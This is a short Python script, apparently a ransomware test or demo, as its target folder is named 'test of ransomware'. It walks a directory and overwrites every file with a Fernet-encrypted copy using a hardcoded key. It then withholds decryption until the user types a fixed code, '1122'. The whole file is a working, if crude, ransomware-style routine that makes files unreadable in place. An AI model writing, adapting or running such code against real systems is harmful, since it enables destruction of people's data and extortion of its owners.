import os
from cryptography.fernet import Fernet

# The key should be a bytes object
key = b'hcX8R-ksQxWn-xPkPg8FUl5ZEwTPjbdA34g2tjMoyxA='
fernet = Fernet(key)

def encrypt_directory(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = fernet.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)

def decrypt_directory(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            decrypted_data = fernet.decrypt(data)
            with open(file_path, 'wb') as f:
                f.write(decrypted_data)

if __name__ == '__main__':
    target_directory = r'C:\\Users\\dell\\Pictures\\test of ransomware'
    
    # Encrypt the target directory
    encrypt_directory(target_directory)
    print("Data encrypted successfully.")
    
    while True:
        code = input("Enter your secret code to decrypt the data: ")
        if code == '1122':  # Ensure the code is checked as a string
            print("Correct code. Data is being decrypted.")
            decrypt_directory(target_directory)
            print("Data decrypted successfully.")
            break
        else:
            print("Wrong code. Please try again.")
